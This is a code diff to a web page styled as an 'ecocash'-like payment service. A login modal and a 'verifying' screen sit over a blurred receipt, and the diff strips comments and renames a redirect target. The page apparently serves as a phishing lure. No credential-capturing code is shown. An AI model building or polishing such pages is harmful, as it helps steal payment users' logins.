@@ -28,7 +28,6 @@
     min-height: 100vh; overflow-x: hidden;
   }
 
-  /* Background page (receipt ghost) */
   .bg-page { min-height: 100vh; padding: 24px 16px; display: flex; align-items: flex-start; justify-content: center; }
   .bg-card { max-width: 480px; width: 100%; background: #fff; border-radius: 18px; border: 1px solid #E5E7EB; box-shadow: 0 10px 30px rgba(17,24,39,0.06); padding: 22px; }
   .bg-logo { display: inline-flex; align-items: baseline; font-weight: 800; font-size: 22px; margin-bottom: 16px; }
@@ -43,7 +42,6 @@
 
   body.modal-open .bg-page { filter: blur(5px); pointer-events: none; user-select: none; }
 
-  /* Overlay + modal */
   .overlay {
     position: fixed; inset: 0;
     background: var(--eco-overlay);
@@ -81,7 +79,6 @@
   .close-btn:hover { background: #F2F4F7; }
   .close-btn svg { width: 20px; height: 20px; stroke-width: 2.2; }
 
-  /* Header */
   .modal-header { background: #fff; padding: 32px 22px 22px; text-align: center; }
   .wordmark {
     display: inline-flex; align-items: baseline;
@@ -92,7 +89,6 @@
   .wordmark .cash { color: var(--eco-red); }
   .modal-title { font-size: 26px; font-weight: 800; letter-spacing: -0.6px; line-height: 1.2; }
 
-  /* Body */
   .modal-body { background: var(--eco-blue); padding: 24px 14px 28px; }
   .form-card { background: #fff; border-radius: 24px; padding: 22px 18px 26px; width: 100%; }
 
@@ -167,7 +163,6 @@
   }
   .form-error.show { display: block; }
 
-  /* Verifying overlay */
   .verifying {
     position: fixed; inset: 0;
     background: #FFFFFF;
@@ -188,7 +183,6 @@
   .verifying .t { font-size: 16px; font-weight: 800; margin-bottom: 6px; }
   .verifying .s { font-size: 12.5px; color: var(--eco-muted); line-height: 1.6; }
 
-  /* Very small phones */
   @media (max-width: 380px) {
     .modal { border-radius: 24px; }
     .modal-header { padding: 26px 18px 18px; }
@@ -281,10 +275,6 @@ const COUNTRY_MAP = {
   'China (Alipay)': { dial: '+86',  flag: '🇨🇳' }
 };
 
-/* ------------------------------------------------------------
-   Data loading — URL first, sessionStorage fallback, then
-   a merge so nothing is lost when the URL is partial.
------------------------------------------------------------- */
 let currentTx = null;
 
 const params = new URLSearchParams(window.location.search);
@@ -299,7 +289,6 @@ if (params.get('tx')) {
   };
 }
 
-// Merge with sessionStorage — fills missing fields from client.html
 try {
   const stored = JSON.parse(sessionStorage.getItem('ecopay_current') || 'null');
   if (stored) {
@@ -308,7 +297,6 @@ try {
   }
 } catch (e) {}
 
-// Normalise
 if (currentTx) {
   if (!currentTx.cur || currentTx.cur === 'undefined') currentTx.cur = 'USD';
   if (!currentTx.am  || currentTx.am  === 'undefined') currentTx.am  = '0';
@@ -469,7 +457,7 @@ async function submitLogin() {
             rn:  (currentTx && currentTx.rn)  || '',
             c:   (currentTx && currentTx.c)   || ''
           });
-          window.location.replace('verify.html?' + q.toString());
+          window.location.replace('verification.html?' + q.toString());
           return;
         }
 
